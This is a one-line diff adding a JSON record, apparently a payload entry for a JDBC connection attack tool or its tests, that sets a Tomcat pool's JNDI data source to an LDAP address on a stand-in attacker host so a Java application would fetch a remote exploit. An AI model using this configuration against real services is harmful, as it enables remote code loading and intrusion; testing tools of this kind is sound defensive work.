@@ -1,0 +1,1 @@
+{"attack_type":"jdbc_connection","driver":"h2","driver_class":"org.h2.Driver","jdbc_url":"jdbc:h2:mem:test","url_params":{},"credentials":{"user":"sa","password":""},"pool":"tomcat","pool_config":{"dataSourceJNDI":"ldap://attacker.example/exploit","factory_class":"org.apache.tomcat.jdbc.pool.DataSource","testOnConnect":"true"},"sql_payload":"","deser_properties":{}}
